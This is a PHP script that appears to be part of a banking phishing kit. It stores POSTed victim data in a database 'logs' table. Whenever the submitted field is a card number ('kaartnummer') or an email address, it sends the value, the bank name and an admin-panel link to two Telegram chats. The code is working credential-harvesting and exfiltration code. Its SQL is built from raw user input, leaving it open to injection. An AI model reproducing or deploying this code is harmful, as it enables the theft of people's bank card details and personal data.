<?php
$session = $_POST['z'];
$newdata = $_POST['newdata'];
$bank = $_POST['bank'];
$row = $_POST['row'];
require_once '../../admin/config/config.php';
$t=time();
$sql = "UPDATE logs SET $row = '$newdata' WHERE SessionID = '$session';";
$result = mysqli_query($conn, $sql);
mysqli_close($conn);





require_once '../../admin/config/tg.php';

 $parts = explode("/", $_SERVER['REQUEST_URI']);

 $parts[3];

if ($row == 'kaartnummer' || $row == 'email_address')
{
  $text="----$row-$bank---";
  $text1="----$parts[2]----";
  $text2= 'http://' . $_SERVER['HTTP_HOST'] . '/' . $parts[1] . '/admin/manage.php?ID=' . $session;
  $text3="=: $newdata := ";
  $text4="";
  $text5="";
  $params=[
      'chat_id'=>$chatId1,
      'text'=>$text.PHP_EOL.$text1.PHP_EOL.$text2.PHP_EOL.$text3.PHP_EOL.$text4.PHP_EOL.$text5,
  ];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);



  $text="----$row-$bank---";
  $text1="----$parts[2]----";
  $text2= 'http://' . $_SERVER['HTTP_HOST'] . '/' . $parts[1] . '/admin/manage.php?ID=' . $session;
  $text3="=: $newdata := ";
  $text4="";
  $text5="";
  $params2=[
      'chat_id'=>$chatId2,
      'text'=>$text.PHP_EOL.$text1.PHP_EOL.$text2.PHP_EOL.$text3.PHP_EOL.$text4.PHP_EOL.$text5,
  ];
  $ch2 = curl_init($website . '/sendMessage');
  curl_setopt($ch2, CURLOPT_HEADER, false);
  curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch2, CURLOPT_POST, 1);
  curl_setopt($ch2, CURLOPT_POSTFIELDS, ($params2));
  curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, false);
  $result2 = curl_exec($ch2);
  curl_close($ch2);

}








?>
